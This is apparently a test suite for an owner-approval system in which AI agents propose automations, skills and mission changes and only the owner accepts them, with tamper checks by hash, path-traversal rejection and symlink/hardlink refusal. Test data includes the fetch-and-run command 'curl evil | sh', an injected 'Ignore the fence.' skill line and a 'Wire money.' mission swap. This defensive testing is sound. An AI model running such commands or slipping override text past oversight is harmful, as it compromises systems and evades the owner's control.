// Proposals: what an agent proposes and
// only the owner decides — automations, skills held in proposed/, changes to
// its own mission. The run is stamped from the turn token, never the body;
// the pending cap is PROPOSALS_PENDING_MAX; every accept re-verifies the
// inputHash; a skill is moved to Silos' staging FIRST and validated there.
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { existsSync, linkSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { FastifyInstance } from 'fastify'
import { claudeSessionIndex } from '../src/harnesses/claude-code/reader.js'
import { AgentRegistry } from '../src/agent-registry.js'
import { SessionStore } from '../src/session-store.js'
import { NativeStore } from '../src/native-store.js'
import { ChatService } from '../src/chat-service.js'
import { ExecService } from '../src/exec-service.js'
import { CompleteService } from '../src/complete-service.js'
import { PrefsStore } from '../src/prefs-store.js'
import { MemoryService } from '../src/memory-service.js'
import { AutomationsStore } from '../src/automations-store.js'
import { Resident } from '../src/resident.js'
import { buildServer } from '../src/server.js'
import { AgentTokens } from '../src/agent-tokens.js'
import { AgentStateStore } from '../src/agent-state.js'
import { ProvidersStore } from '../src/providers-store.js'
import { TerritoryStore } from '../src/territory-store.js'
import { PROPOSAL_TTL_MS, PROPOSALS_PENDING_MAX } from '../src/limits.js'
import { ProposalsStore, decidedWords, REVIEW_RESULT } from '../src/proposals.js'
import { agentMayRead, agentMayWrite } from '../src/agent-authz.js'
import { liveTurnOf } from './helpers/live-turn.js'

const TOKEN = 't0k-proposals'
const LOCAL = { host: '127.0.0.1:3210' }
const owner = { ...LOCAL, 'x-token': TOKEN }

let app: FastifyInstance
let dataDir: string, folder: string, base: string
let registry: AgentRegistry
let automations: AutomationsStore
let resident: Resident
let tokens: AgentTokens
let chat: ChatService
let proposals: ProposalsStore
let agentState: AgentStateStore
let providers: ProvidersStore
let territory: TerritoryStore

beforeEach(async () => {
  base = mkdtempSync(join(tmpdir(), 'silos-proposals-'))
  const root = join(base, 'projects')
  dataDir = join(base, 'data')
  folder = join(base, 'proj')
  mkdirSync(root, { recursive: true })
  mkdirSync(join(dataDir, 'trash'), { recursive: true })
  mkdirSync(folder, { recursive: true })
  const index = claudeSessionIndex(root, join(dataDir, 'cache.json'))
  await index.init()
  registry = new AgentRegistry(join(dataDir, 'agents.json'))
  registry.load()
  registry.create({ id: 'ana', name: 'Ana', folder })
  registry.create({ id: 'bo', name: 'Bo', folder })
  tokens = new AgentTokens(dataDir)
  agentState = new AgentStateStore(join(dataDir, 'agent-state'), tokens)
  const native = new NativeStore(join(dataDir, 'native.json'))
  chat = new ChatService({
    registry,
    native,
    queryFn: () => {
      throw new Error('no turns here')
    },
    dataDir,
  })
  automations = new AutomationsStore(dataDir)
  automations.load()
  resident = new Resident({ store: automations, registry, chat, native, index, root, dataDir, broadcast: () => {}, tickIntervalMs: 999_999_999 })
  providers = new ProvidersStore(dataDir)
  providers.load()
  territory = new TerritoryStore(dataDir)
  territory.setEnabled(['ana'])
  proposals = new ProposalsStore(dataDir)
  proposals.load()
  app = buildServer({
    index,
    registry,
    store: new SessionStore(root, dataDir),
    native,
    chat,
    exec: new ExecService(registry),
    complete: new CompleteService(registry, index),
    prefs: new PrefsStore(dataDir),
    memory: new MemoryService(root, dataDir, registry),
    token: TOKEN,
    liveMs: 120_000,
    automations,
    resident,
    agentTokens: tokens,
    agentState,
    providers,
    proposals,
    territoryStore: territory,
    dataDir,
  })
})

afterEach(async () => {
  resident.stop()
  await app.close()
})

const bearer = (id: string) => ({ ...LOCAL, authorization: `Bearer ${tokens.tokenFor(id)}` })
const turnOf = (id: string, decl: Parameters<typeof liveTurnOf>[2] = { class: 'chat' }) => liveTurnOf(chat, id, decl)
const cron = (o: Record<string, unknown> = {}) => ({
  name: 'Morning digest',
  agentId: 'ana',
  prompt: 'Summarize the inbox.',
  trigger: { kind: 'cron', expr: '0 * * * *' },
  ...o,
})
const command = () =>
  cron({ name: 'Sync', prompt: 'the sync failed: read its log', run: { kind: 'command', argv: ['/usr/bin/true', 'sync'], cwd: folder, onFailure: 'inbox' } })
const propose = (id: string, body: Record<string, unknown>, turn: string = turnOf(id)) =>
  app.inject({ method: 'POST', url: '/api/proposals', headers: bearer(id), payload: { ...body, turn } })
const accept = (pid: string, payload: Record<string, unknown> = {}) =>
  app.inject({ method: 'POST', url: `/api/proposals/${pid}/accept`, headers: owner, payload })

const proposedDir = (id: string, name: string) => join(agentState.dirFor(id), 'proposed', name)
function writeSkill(id: string, name: string, files: Record<string, string> = { 'SKILL.md': '---\nname: x\n---\nDo it.\n' }): string {
  const dir = proposedDir(id, name)
  mkdirSync(dir, { recursive: true })
  for (const [rel, text] of Object.entries(files)) {
    mkdirSync(join(dir, rel, '..'), { recursive: true })
    writeFileSync(join(dir, rel), text)
  }
  return dir
}
const pluginSkill = (id: string, name: string) => join(agentState.dirFor(id), 'plugin', 'skills', name)

describe('POST /api/proposals — the kinds and their words', () => {
  it('an automation: 201, stored as posted; a twin answers 200 with the same proposal', async () => {
    const r = await propose('ana', { kind: 'automation', reason: 'the inbox piles up', input: cron() })
    expect(r.statusCode).toBe(201)
    const p = r.json().proposal
    expect(p).toMatchObject({ by: 'ana', kind: 'automation', state: 'pending', reason: 'the inbox piles up' })
    expect(p.inputHash).toMatch(/^[0-9a-f]{64}$/)
    expect(Date.parse(p.expiresAt) - Date.parse(p.at)).toBe(PROPOSAL_TTL_MS)
    const twin = await propose('ana', { kind: 'automation', reason: 'again', input: { ...cron(), name: 'Morning digest' } })
    expect([twin.statusCode, twin.json().proposal.id]).toEqual([200, p.id])
  })

  it('400: the kind, the reason, an automation that would not validate', async () => {
    expect((await propose('ana', { kind: 'plan', reason: 'x', input: {} })).json()).toEqual({ error: 'kind must be automation, skill or mission' })
    expect((await propose('ana', { kind: 'automation', reason: '  ', input: cron() })).json()).toEqual({ error: 'reason required: one line saying why' })
    const bad = await propose('ana', { kind: 'automation', reason: 'x', input: cron({ trigger: { kind: 'cron', expr: 'nope' } }) })
    expect(bad.statusCode).toBe(400)
  })

  it('an agent proposes only for itself (403), and the owner never proposes', async () => {
    const other = await propose('ana', { kind: 'automation', reason: 'x', input: cron({ agentId: 'bo' }) })
    expect(other.statusCode).toBe(403)
    const own = await app.inject({ method: 'POST', url: '/api/proposals', headers: owner, payload: { kind: 'automation', reason: 'x', input: cron() } })
    expect(own.statusCode).toBe(403)
    expect(proposals.list()).toEqual([])
  })

  it(`429 past ${PROPOSALS_PENDING_MAX} pending of one agent — any kinds — with the exact words; another agent is not counted`, async () => {
    for (let i = 0; i < PROPOSALS_PENDING_MAX; i++) {
      expect((await propose('ana', { kind: 'automation', reason: `r${i}`, input: cron({ name: `A${i}` }) })).statusCode).toBe(201)
    }
    const over = await propose('ana', { kind: 'mission', reason: 'r', input: { text: 'Keep the books.' } })
    expect([over.statusCode, over.json()]).toEqual([429, { error: '3 suggestions already wait for the owner — wait for a decision' }])
    expect((await propose('bo', { kind: 'automation', reason: 'r', input: cron({ agentId: 'bo' }) })).statusCode).toBe(201)
  })

  it('a mission: { text?, never? } with its words', async () => {
    expect((await propose('ana', { kind: 'mission', reason: 'r', input: {} })).json()).toEqual({ error: 'mission.text must be 1–2000 characters' })
    expect((await propose('ana', { kind: 'mission', reason: 'r', input: { never: Array.from({ length: 11 }, (_, i) => `n${i}`) } })).json()).toEqual({
      error: 'mission.never must be up to 10 lines of up to 200 characters',
    })
    expect((await propose('ana', { kind: 'mission', reason: 'r', input: { never: ['Pay anything'] } })).statusCode).toBe(201)
  })
})

describe('run: stamped by the server from the turn token, never from the body (M1)', () => {
  it('an unattended turn stamps its run; a forged `run` in the body is ignored', async () => {
    const t = turnOf('ana', { class: 'heartbeat', kind: 'think', runId: 'run-hb-1' })
    const r = await app.inject({
      method: 'POST',
      url: '/api/proposals',
      headers: bearer('ana'),
      payload: { kind: 'automation', reason: 'r', input: cron(), turn: t, run: 'forged' },
    })
    expect(r.statusCode).toBe(201)
    expect(r.json().proposal.run).toBe('run-hb-1')
    expect(proposals.byRun('ana', 'run-hb-1').map((p) => p.id)).toEqual([r.json().proposal.id])
    expect(proposals.byRun('ana', 'forged')).toEqual([])
  })

  it('a wake stamps its turn id; an attended chat has no run', async () => {
    const wake = await propose('ana', { kind: 'automation', reason: 'r', input: cron({ name: 'W' }) }, turnOf('ana', { class: 'wake', taskKey: 'k' }))
    expect(wake.json().proposal.run).toBe('test-ana')
    const attended = await propose('ana', { kind: 'automation', reason: 'r', input: cron({ name: 'C' }), run: 'forged' })
    expect(attended.json().proposal.run).toBeUndefined()
  })

  it('without a turn the bearer write never reaches the route', async () => {
    const r = await app.inject({ method: 'POST', url: '/api/proposals', headers: bearer('ana'), payload: { kind: 'automation', reason: 'r', input: cron() } })
    expect(r.statusCode).toBe(403)
    expect(proposals.list()).toEqual([])
  })

  it('the audit hooks: restampRun marks every proposal of the run; dismissTainted dismisses its pending ones (Silos, tainted)', async () => {
    const t = turnOf('ana', { class: 'heartbeat', kind: 'look', runId: 'run-2' })
    const a = (await propose('ana', { kind: 'automation', reason: 'r', input: cron() }, t)).json().proposal
    proposals.restampRun('ana', 'run-2', ['WebFetch'])
    expect(proposals.get(a.id)!.readOutside).toEqual(['WebFetch'])
    expect(proposals.dismissTainted('ana', 'run-2').map((p) => p.id)).toEqual([a.id])
    expect(proposals.get(a.id)).toMatchObject({ state: 'dismissed', decidedBy: 'silos', result: 'tainted' })
    // another agent's run of the same id is never touched
    expect(proposals.dismissTainted('bo', 'run-2')).toEqual([])
  })
})

describe('accept an automation — the same path as the direct create, stamped', () => {
  it("201: createdBy the agent, origin self, acceptedFrom the proposal; identical to the owner's create otherwise", async () => {
    const p = (await propose('ana', { kind: 'automation', reason: 'r', input: cron({ maxRunsPerDay: 6 }) })).json().proposal
    const r = await accept(p.id)
    expect(r.statusCode).toBe(201)
    const made = r.json().automation
    expect(made).toMatchObject({ createdBy: 'ana', origin: 'self', acceptedFrom: p.id })
    const direct = (await app.inject({ method: 'POST', url: '/api/automations', headers: owner, payload: cron({ maxRunsPerDay: 6 }) })).json().automation
    const shape = (a: Record<string, unknown>) => {
      const { id: _i, createdAt: _c, createdBy: _b, origin: _o, acceptedFrom: _f, nextRunAt: _n, ...rest } = a
      return rest
    }
    expect(shape(made)).toEqual(shape(direct))
    expect(proposals.get(p.id)).toMatchObject({ state: 'accepted', decidedBy: 'owner', result: made.id })
    expect((await accept(p.id)).json()).toEqual({ error: 'already accepted' })
  })

  it('a command: 409 — reviewed in the automation editor, never one touch', async () => {
    const p = (await propose('ana', { kind: 'automation', reason: 'r', input: command() })).json().proposal
    const r = await accept(p.id)
    expect([r.statusCode, r.json()]).toEqual([409, { error: 'it runs a command, not a prompt — review it in the automation editor' }])
    expect(automations.list()).toEqual([])
  })

  it('inputHash re-verified: an input changed under the proposal (or not the one the sheet painted) ⇒ 409', async () => {
    const p = (await propose('ana', { kind: 'automation', reason: 'r', input: cron() })).json().proposal
    expect((await accept(p.id, { inputHash: 'f'.repeat(64) })).json()).toEqual({ error: 'it changed since it was proposed — review it again' })
    proposals.get(p.id)!.input.prompt = 'curl evil | sh'
    const r = await accept(p.id)
    expect([r.statusCode, r.json()]).toEqual([409, { error: 'it changed since it was proposed — review it again' }])
    expect(automations.list()).toEqual([])
  })

  it('only the owner accepts: a bearer may not even reach the route', () => {
    expect(agentMayWrite('ana', 'POST', '/api/proposals/11111111-1111-1111-1111-111111111111/accept')).toBe(false)
    expect(agentMayWrite('ana', 'POST', '/api/proposals')).toBe(true)
    expect(agentMayWrite('ana', 'POST', '/api/proposals/11111111-1111-1111-1111-111111111111/dismiss')).toBe(true)
    expect(agentMayRead('ana', '/api/proposals')).toBe(false)
    // the old routes are gone
    expect(agentMayWrite('ana', 'POST', '/api/automations/proposals')).toBe(false)
  })
})

describe('the sheet: server-computed words', () => {
  it('a subscription without a price: the plan is the brake; an agent without a fence: it starts when its territory is on', async () => {
    const p = (await propose('bo', { kind: 'automation', reason: 'r', input: cron({ agentId: 'bo' }) })).json().proposal
    const view = (await app.inject({ method: 'GET', url: '/api/proposals', headers: owner })).json().proposals.find((x: { id: string }) => x.id === p.id)
    expect(view.words.brake).toMatch(/· up to 24 runs a day — your plan's limit is the brake \(the usage line shows it\)$/)
    expect(view.words.territoryOff).toBe("it starts when Bo's territory is on")
    expect(view.automation).toMatchObject({ name: 'Morning digest', maxRunsPerDay: 24, prompt: 'Summarize the inbox.' })
    expect(view.review).toBe(false)
  })

  it("a provider that prices: it spends within the agent's daily cap; a command is Review only and shows its full line", async () => {
    const gw = providers.create({ kind: 'anthropic-compatible', label: 'Gateway', baseUrl: 'https://gateway.invalid/v1', apiKey: 'k' })
    registry.update('ana', { provider: gw.id })
    const p = (await propose('ana', { kind: 'automation', reason: 'r', input: cron({ maxRunsPerDay: 3 }) })).json().proposal
    const c = (await propose('ana', { kind: 'automation', reason: 'r', input: command() })).json().proposal
    const views = (await app.inject({ method: 'GET', url: '/api/proposals', headers: owner })).json().proposals
    const v = views.find((x: { id: string }) => x.id === p.id)
    expect(v.words.brake).toMatch(/· up to 3 runs a day — spends within Ana's daily cap$/)
    expect(v.words.territoryOff).toBeUndefined()
    const cv = views.find((x: { id: string }) => x.id === c.id)
    expect(cv.review).toBe(true)
    expect(cv.automation.command).toBe('/usr/bin/true sync')
  })
})

describe("the brake's words follow the install's unattended switch", () => {
  it('an agent on its plan, the switch on a key: «spends within»; its runsOn on a plan wins back', async () => {
    const { proposalWords } = await import('../src/proposals-view.js')
    const gw = providers.create({ kind: 'anthropic-compatible', label: 'Gateway', baseUrl: 'https://gateway.invalid/v1', apiKey: 'k' })
    const mk = (input: Record<string, unknown>) =>
      ({
        id: 'p',
        by: 'bo',
        at: '2026-11-11T00:00:00Z',
        kind: 'automation',
        reason: 'r',
        input: { ...cron({ agentId: 'bo' }), ...input },
      }) as unknown as Parameters<typeof proposalWords>[0]
    const d = { registry, providers, unattendedProvider: () => gw.id }
    expect(proposalWords(mk({}), d).brake).toMatch(/— spends within Bo's daily cap$/)
    expect(proposalWords(mk({ runsOn: { provider: 'default' } }), d).brake).toMatch(/— your plan's limit is the brake/)
    expect(proposalWords(mk({}), { registry, providers }).brake).toMatch(/— your plan's limit is the brake/)
  })
})

describe('a proposal with a period keeps the default budget and says its pace', () => {
  it("«≈ <n> runs a day, outside X's daily max» before the touch; the accept keeps 24", async () => {
    const p = (
      await propose('ana', { kind: 'automation', reason: 'r', input: cron({ trigger: { kind: 'period', period: { every: 15, unit: 'minutes' } } }) })
    ).json().proposal
    const v = (await app.inject({ method: 'GET', url: '/api/proposals', headers: owner })).json().proposals.find((x: { id: string }) => x.id === p.id)
    expect(v.words.pace).toBe("≈ 96 runs a day, outside Ana's daily max")
    const r = await accept(p.id)
    expect(r.statusCode).toBe(201)
    expect(r.json().automation.maxRunsPerDay).toBeUndefined()
  })
})

describe('mission: always «Review ›» (S6) and its save resolves the proposal (S5-r4)', () => {
  it('POST accept is ALWAYS 409', async () => {
    const p = (await propose('ana', { kind: 'mission', reason: 'r', input: { text: 'Keep the books.' } })).json().proposal
    const r = await accept(p.id)
    expect([r.statusCode, r.json()]).toEqual([409, { error: "a mission is the owner's text — review it in the mission editor" }])
    expect(registry.get('ana')!.mission).toBeUndefined()
  })

  it('closing the editor without saving leaves it pending; saving from Review marks it accepted, edited and saved by the owner', async () => {
    const p = (await propose('ana', { kind: 'mission', reason: 'r', input: { text: 'Keep the books.', never: ['Pay anything'] } })).json().proposal
    // a save of something else, without the proposal: nothing resolved
    await app.inject({ method: 'PATCH', url: '/api/agents/ana', headers: owner, payload: { name: 'Ana' } })
    expect(proposals.get(p.id)!.state).toBe('pending')
    const saved = await app.inject({
      method: 'PATCH',
      url: '/api/agents/ana',
      headers: owner,
      payload: { mission: { text: 'Keep the books, monthly.', never: ['Pay anything'] }, proposal: p.id },
    })
    expect(saved.statusCode).toBe(200)
    expect(registry.get('ana')!.mission?.text).toBe('Keep the books, monthly.')
    expect(proposals.get(p.id)).toMatchObject({ state: 'accepted', decidedBy: 'owner', result: REVIEW_RESULT })
    expect(decidedWords(proposals.get(p.id)!)).toBe('your suggestion «r» was accepted — edited and saved by the owner')
  })

  it('a Review save of a proposal whose input changed is refused before anything is written', async () => {
    const p = (await propose('ana', { kind: 'mission', reason: 'r', input: { text: 'Keep the books.' } })).json().proposal
    proposals.get(p.id)!.input.text = 'Wire money.'
    const r = await app.inject({ method: 'PATCH', url: '/api/agents/ana', headers: owner, payload: { mission: { text: 'Keep the books.' }, proposal: p.id } })
    expect([r.statusCode, r.json()]).toEqual([409, { error: 'it changed since it was proposed — review it again' }])
    expect(registry.get('ana')!.mission).toBeUndefined()
  })

  it("the automation editor's create from a command's Review resolves it the same way", async () => {
    const p = (await propose('ana', { kind: 'automation', reason: 'r', input: command() })).json().proposal
    const r = await app.inject({ method: 'POST', url: '/api/automations', headers: owner, payload: { ...command(), name: 'Sync (edited)', proposal: p.id } })
    expect(r.statusCode).toBe(201)
    expect(r.json().automation.origin).toBeUndefined()
    expect(proposals.get(p.id)).toMatchObject({ state: 'accepted', result: REVIEW_RESULT })
    const again = await app.inject({ method: 'POST', url: '/api/automations', headers: owner, payload: { ...command(), proposal: p.id } })
    expect([again.statusCode, again.json()]).toEqual([409, { error: 'already accepted' }])
  })
})

describe('skills: held in proposed/, accepted by moving FIRST and validating what was moved', () => {
  it('slug 400 at propose — `..` and `../commands/evil` included', async () => {
    for (const name of ['..', '../commands/evil', 'Evil', '-x', 'a'.repeat(41), '']) {
      const r = await propose('ana', { kind: 'skill', reason: 'r', input: { name } })
      expect([name, r.statusCode, r.json()]).toEqual([name, 400, { error: 'skill name must be a slug: a-z, 0-9 and dashes' }])
    }
  })

  it('no SKILL.md: 400 with its path', async () => {
    mkdirSync(proposedDir('ana', 'empty'), { recursive: true })
    const r = await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'empty' } })
    expect([r.statusCode, r.json()]).toEqual([400, { error: 'no SKILL.md at $SILOS_AGENT_STATE/proposed/empty/SKILL.md' }])
  })

  it('accept: moved to plugin/skills/<name> with the manifest, 200 loadsAt next conversation; the sheet listed every file', async () => {
    writeSkill('ana', 'invoices', { 'SKILL.md': '# invoices\n', 'scripts/payload.sh': 'echo hi\n' })
    const p = (await propose('ana', { kind: 'skill', reason: 'it keeps forgetting', input: { name: 'invoices' } })).json().proposal
    expect(p.contentHash).toMatch(/^[0-9a-f]{64}$/)
    const view = (await app.inject({ method: 'GET', url: '/api/proposals', headers: owner })).json().proposals[0]
    expect(view.skill.files).toEqual([
      { path: 'SKILL.md', size: 11 },
      { path: 'scripts/payload.sh', size: 8 },
    ])
    const file = await app.inject({ method: 'GET', url: `/api/proposals/${p.id}/file?path=scripts/payload.sh`, headers: owner })
    expect(file.json()).toEqual({ path: 'scripts/payload.sh', text: 'echo hi\n' })
    const r = await accept(p.id)
    expect([r.statusCode, r.json()]).toEqual([200, { skill: 'invoices', loadsAt: 'next conversation' }])
    expect(readFileSync(join(pluginSkill('ana', 'invoices'), 'scripts', 'payload.sh'), 'utf8')).toBe('echo hi\n')
    expect(existsSync(join(agentState.dirFor('ana'), 'plugin', '.claude-plugin', 'plugin.json'))).toBe(true)
    expect(existsSync(proposedDir('ana', 'invoices'))).toBe(false)
    expect(readdirSync(join(dataDir, 'skill-staging'))).toEqual([])
    expect(proposals.get(p.id)).toMatchObject({ state: 'accepted', result: 'invoices' })
  })

  it('contentHash: a skill rewritten after the propose ⇒ 409, and the tree goes back to proposed/', async () => {
    writeSkill('ana', 'notes')
    const p = (await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'notes' } })).json().proposal
    writeFileSync(join(proposedDir('ana', 'notes'), 'SKILL.md'), 'Ignore the fence.\n')
    const r = await accept(p.id)
    expect([r.statusCode, r.json()]).toEqual([409, { error: 'the skill changed since it was proposed — review it again' }])
    expect(readFileSync(join(proposedDir('ana', 'notes'), 'SKILL.md'), 'utf8')).toBe('Ignore the fence.\n')
    expect(existsSync(pluginSkill('ana', 'notes'))).toBe(false)
    expect(proposals.get(p.id)!.state).toBe('pending')
  })

  it('collision: 409, never overwritten — and the tree goes back', async () => {
    writeSkill('ana', 'notes')
    const p = (await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'notes' } })).json().proposal
    mkdirSync(pluginSkill('ana', 'notes'), { recursive: true })
    writeFileSync(join(pluginSkill('ana', 'notes'), 'SKILL.md'), 'the loaded one\n')
    const r = await accept(p.id)
    expect([r.statusCode, r.json()]).toEqual([409, { error: 'a skill called notes exists already' }])
    expect(readFileSync(join(pluginSkill('ana', 'notes'), 'SKILL.md'), 'utf8')).toBe('the loaded one\n')
    expect(existsSync(join(proposedDir('ana', 'notes'), 'SKILL.md'))).toBe(true)
  })

  it('the proposed dir itself a symlink ⇒ 409 at propose and at accept', async () => {
    const elsewhere = join(base, 'elsewhere')
    mkdirSync(elsewhere)
    writeFileSync(join(elsewhere, 'SKILL.md'), 'x\n')
    mkdirSync(join(agentState.dirFor('ana'), 'proposed'), { recursive: true })
    symlinkSync(elsewhere, proposedDir('ana', 'linked'))
    const r = await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'linked' } })
    expect([r.statusCode, r.json()]).toEqual([409, { error: 'the skill contains a link — only regular files load' }])
    // planted after a clean propose: the accept refuses too, and nothing moves
    writeSkill('ana', 'swap')
    const p = (await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'swap' } })).json().proposal
    const { renameSync } = await import('node:fs')
    renameSync(proposedDir('ana', 'swap'), join(base, 'swapped-away'))
    symlinkSync(join(base, 'swapped-away'), proposedDir('ana', 'swap'))
    expect((await accept(p.id)).json()).toEqual({ error: 'the skill contains a link — only regular files load' })
    expect(existsSync(pluginSkill('ana', 'swap'))).toBe(false)
  })

  for (const kind of ['symlink', 'hardlink'] as const) {
    it(`a ${kind} INSIDE the tree ⇒ 409 at propose; planted after it ⇒ 409 at accept, and the tree goes back to proposed/`, async () => {
      const secret = join(base, 'secret.txt')
      writeFileSync(secret, 'the owner token\n')
      const plant = (dir: string) => (kind === 'symlink' ? symlinkSync(secret, join(dir, 'ref.md')) : linkSync(secret, join(dir, 'ref.md')))
      const bad = writeSkill('ana', 'bad')
      plant(bad)
      const r = await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'bad' } })
      expect([r.statusCode, r.json()]).toEqual([409, { error: 'the skill contains a link — only regular files load' }])
      const ok = writeSkill('ana', 'later')
      const p = (await propose('ana', { kind: 'skill', reason: 'r', input: { name: 'later' } })).json().proposal
      mkdirSync(join(ok, 'deep'))
      plant(join(ok, 'deep'))
      const a = await accept(p.id)
      expect([a.statusCode, a.json()]).toEqual([409, { error: 'the skill contains a link — only regular files load' }])
      expect(existsSync(join(proposedDir('ana', 'later'), 'deep', 'ref.md'))).toBe(true)
      expect(existsSync(pluginSkill('ana', 'later'))).toBe(false)
    })
  }
})

describe('dismiss and expiry', () => {
  it("the owner dismisses with a reason that travels to the packet; the agent withdraws its own, never another's", async () => {
    const a = (await propose('ana', { kind: 'automation', reason: 'r', input: cron() })).json().proposal
    const d = await app.inject({ method: 'POST', url: `/api/proposals/${a.id}/dismiss`, headers: owner, payload: { reason: 'we have one already' } })
    expect(d.json().proposal).toMatchObject({ state: 'dismissed', decidedBy: 'owner', result: 'we have one already' })
    expect(decidedWords(proposals.get(a.id)!)).toBe('your suggestion «r» was dismissed: we have one already')
    const b = (await propose('bo', { kind: 'automation', reason: 'r', input: cron({ agentId: 'bo' }) })).json().proposal
    expect(
      (await app.inject({ method: 'POST', url: `/api/proposals/${b.id}/dismiss`, headers: bearer('ana'), payload: { turn: turnOf('ana') } })).statusCode,
    ).toBe(403)
    const own = await app.inject({ method: 'POST', url: `/api/proposals/${b.id}/dismiss`, headers: bearer('bo'), payload: { turn: turnOf('bo') } })
    expect(own.json().proposal).toMatchObject({ state: 'dismissed', decidedBy: 'bo' })
  })

  it("TTL: 14 days pending ⇒ expired by Silos, with the packet's words — and the slot frees", () => {
    let now = Date.parse('2026-11-01T10:00:00Z')
    const store = new ProposalsStore(join(base, 'ttl'), () => now)
    mkdirSync(join(base, 'ttl'))
    const p = store.add({ by: 'ana', kind: 'mission', reason: 'r', input: { text: 'x' } })
    now += PROPOSAL_TTL_MS - 1
    expect(store.expireDue(now)).toBe(0)
    now += 1
    expect(store.expireDue(now)).toBe(1)
    expect(store.get(p.id)).toMatchObject({ state: 'expired', decidedBy: 'silos', result: 'expired unanswered' })
    expect(store.pendingCount('ana')).toBe(0)
    expect(decidedWords(store.get(p.id)!)).toBe("your suggestion «r» expired unanswered — don't resend it without a new signal")
    // persisted and reloaded
    const again = new ProposalsStore(join(base, 'ttl'))
    again.load()
    expect(again.get(p.id)!.state).toBe('expired')
  })
})
